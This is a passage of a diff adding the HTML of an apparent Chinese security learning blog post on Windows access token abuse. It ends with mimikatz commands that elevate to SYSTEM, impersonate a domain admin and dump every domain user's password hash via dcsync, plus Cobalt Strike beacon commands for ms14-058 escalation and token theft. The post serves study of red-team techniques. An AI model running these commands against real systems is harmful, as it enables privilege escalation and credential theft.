class="line">mimikatz <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<p>因为 TOKEN::List 操作，列举的太多了，我就以点省略了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TOKEN::Elevate 把当前提升为 sytem 令牌</span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\Windows-Access-Token-Security-Exploration\猕猴桃抓取.png" alt></p>
+<p>其它的命令还剩下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mikatz <span class="comment"># TOKEN::Elevate /domainadmin 模拟域管令牌</span></span><br><span class="line">mikatz <span class="comment"># lsadump::dcsync /domain:rotkit.org /al /csv 导出域控种的所有用户的密码 hash</span></span><br><span class="line">mikatz <span class="comment"># token::revrt 还原令牌到初始状态</span></span><br></pre></td></tr></table></figure>
+<p>5、CobaltSrike 中的 steal_token 插件</p>
+<p>CS这个工具，我对这个也不是很熟练，而且相应演练环境也怎么弄过，就直接贴操作命令了。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; getuid  <span class="comment"># 查看当前用户</span></span><br><span class="line">beacon&gt; elvate ms14-<span class="number">05</span>8 sytem  <span class="comment"># 利用 ms14-058 进行提升权限</span></span><br><span class="line">beacon&gt; steal_token <span class="number">1234</span>  <span class="comment"># 伪造UID为 1234 进程的用户令牌</span></span><br><span class="line">beacon&gt; rev2self <span class="comment"># 返回原始令牌</span></span><br></pre></td></tr></table></figure>
+<p>很多理论性的东西，只要自己操作一遍，才会知道，原来会有这么多坑。。。</p>
+<p><strong>0x07 参考文章</strong></p>
+<p>[1] <a href="https://blog.csdn.net/huhaoxuan2010/article/details/78404136" target="_blank" rel="noopener">https://blog.csdn.net/huhaoxuan2010/article/details/78404136</a><br>[2] <a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/</a><br>[3] <a href="https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C/16846911?fr=aladdin" target="_blank" rel="noopener">https://baike.baidu.com/item/%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C/16846911?fr=aladdin</a><br>[4] <a href="https://www.lshack.cn/721/" target="_blank" rel="noopener">https://www.lshack.cn/721/</a></p>
+
+      
+      
+        
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="sh1yan.top/2019/06/09/Windows-Access-Token-Security-Exploration/" data-id="cl64hepgj004lasw1mw4rmiq3" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/access-token/">access token</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/令牌伪造/">令牌伪造</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+    
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-about" class="widget-title">About</h3>
+    <div class="widget">
+
+<!-- 优美的分割线 -->
+
+    <div style="width:249px;height:190px;border:1px none ;text-align:center">
+  <img src="//sh1yan.top/icon.png" alt="shiyan" style="width:190px;height:190px;display:inline-block;margin:0 auto">
+  </div>
+<br>
+
+
+<p style="font-size:15px">ID：shiyan</p>
+<p style="font-size:14px">个人简介：会开挖挖机的园工~</p>
+<p style="font-size:14px">
+<a href="mailto:506130869@qq.com">Email：506130869@qq.com</a><br>
+<a href="https://github.com/shiyan-520">GitHub：https://github.com/shiyan-520</a>
+</p>
+
+
+<!-- 优美的分割线 -->
+
+      
+      
+      <p></p>
+      
+      
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-tagcloud" class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/Android/" style="font-size: 10px;">Android</a> <a href="/tags/ByPass-UAC/" style="font-size: 10px;">ByPass-UAC</a> <a href="/tags/CMS/" style="font-size: 13.33px;">CMS</a> <a href="/tags/COM组件劫持/" style="font-size: 10px;">COM组件劫持</a> <a href="/tags/Cobalt-Strike/" style="font-size: 10px;">Cobalt Strike</a> <a href="/tags/DLL劫持/" style="font-size: 10px;">DLL劫持</a> <a href="/tags/Excel/" style="font-size: 13.33px;">Excel</a> <a href="/tags/JavaWeb/" style="font-size: 20px;">JavaWeb</a> <a href="/tags/Kerberos认证/" style="font-size: 10px;">Kerberos认证</a> <a href="/tags/Oracle/" style="font-size: 10px;">Oracle</a> <a href="/tags/PHP/" style="font-size: 13.33px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Python3/" style="font-size: 10px;">Python3</a> <a href="/tags/Rmi协议/" style="font-size: 10px;">Rmi协议</a> <a href="/tags/SMBMS/" style="font-size: 10px;">SMBMS</a> <a href="/tags/UAC/" style="font-size: 10px;">UAC</a> <a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/access-token/" style="font-size: 10px;">access token</a> <a href="/tags/burp/" style="font-size: 16.67px;">burp</a> <a href="/tags/hash/" style="font-size: 10px;">hash</a> <a href="/tags/java/" style="font-size: 10px;">java</a> <a href="/tags/jsonp/" style="font-size: 10px;">jsonp</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/mybatis/" style="font-size: 10px;">mybatis</a> <a href="/tags/mysql/" style="font-size: 13.33px;">mysql</a> <a href="/tags/pandas/" style="font-size: 10px;">pandas</a> <a href="/tags/shell/" style="font-size: 10px;">shell</a> <a href="/tags/spring5/" style="font-size: 10px;">spring5</a> <a href="/tags/sqlmap/" style="font-size: 10px;">sqlmap</a> <a href="/tags/vba/" style="font-size: 13.33px;">vba</a> <a href="/tags/web漏洞/" style="font-size: 13.33px;">web漏洞</a> <a href="/tags/令牌伪造/" style="font-size: 10px;">令牌伪造</a> <a href="/tags/动态代理/" style="font-size: 10px;">动态代理</a> <a href="/tags/博客源码/" style="font-size: 10px;">博客源码</a> <a href="/tags/博客问题解决/" style="font-size: 10px;">博客问题解决</a> <a href="/tags/反射/" style="font-size: 10px;">反射</a> <a href="/tags/域渗透/" style="font-size: 10px;">域渗透</a> <a href="/tags/学习笔记/" style="font-size: 16.67px;">学习笔记</a> <a href="/tags/安全审计/" style="font-size: 13.33px;">安全审计</a> <a href="/tags/安全服务/" style="font-size: 10px;">安全服务</a> <a href="/tags/工具分析/" style="font-size: 10px;">工具分析</a> <a href="/tags/序列化/" style="font-size: 10px;">序列化</a> <a href="/tags/报错注入/" style="font-size: 10px;">报错注入</a> <a href="/tags/漏洞复现/" style="font-size: 10px;">漏洞复现</a> <a href="/tags/生活记录/" style="font-size: 10px;">生活记录</a> <a href="/tags/端口转发/" style="font-size: 10px;">端口转发</a> <a href="/tags/脚本编写/" style="font-size: 10px;">脚本编写</a> <a href="/tags/部署上线/" style="font-size: 10px;">部署上线</a>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 id="widget-title-recent-posts" class="widget-title">Recents</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/03/20/Mybatis-3-learning-notes/">mybatis-3学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/08/02/Spring-5-learning-notes/">Spring5学习笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2020/07/18/An-audit-of-Java-Web-smbms/">记一次对JavaWeb-SMBMS的审计</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/18/Java-RMI-protocol-learning/">Java Rmi协议学习</a>
+          </li>
+        
+          <li>
+            <a href="/2020/06/13/Java-Dynamic-agent-mode/">Java动态代理模式</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+  
+</aside>
+
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+    不要因为走了太久而忘记当初为什么出发。
+    <br>
+    Copyrights &copy; 2022 shiyan All Rights Reserved. 
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span id="busuanzi_container_site_uv"> 
+    <a>「</a>本站访客数<span id="busuanzi_value_site_uv"></span>人次<a>」</a>
+    </span></div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/gossip" class="mobile-nav-link">Gossip</a>
+  
+    <a href="/yqlj" class="mobile-nav-link">Links</a>
+  
+</nav>
+
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/ja_JP/sdk.js#xfbml=1&version=v2.4";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+<script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
+
+<script src="/js/script.js"></script>
+
+
+  </div>
+</body>
+</html>
